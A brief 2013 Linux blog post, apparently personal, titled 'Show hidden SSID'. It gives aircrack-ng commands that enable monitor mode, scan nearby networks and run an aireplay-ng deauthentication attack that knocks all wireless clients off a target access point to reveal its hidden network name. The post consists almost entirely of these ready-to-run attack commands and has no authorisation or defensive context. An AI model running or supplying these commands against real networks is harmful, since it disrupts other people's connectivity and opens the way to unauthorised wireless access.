---
_edit_last: "1"
Hide OgTags: "0"
Hide SexyBookmarks: "0"
author: thomasf
categories:
  - linux
date: "2013-05-21T22:03:09+00:00"
dsq_thread_id: "5288625574"
guid: https://blog.wapnet.nl/?p=1050
parent_post_id: null
post_id: "1050"
title: Show hidden SSID
url: /2013/05/show-hidden-ssid/

---
> airmon-ng start wlan0
>
> airmon-ng
>
> airodump-ng mon0

get the mac of the hidden SIDD and do a de-auth attack to force disconnect all wireless clients

> aireplay-ng -0 2 -a xx:xx:xx:xx:xx:xx mon0

now you can see the SSID
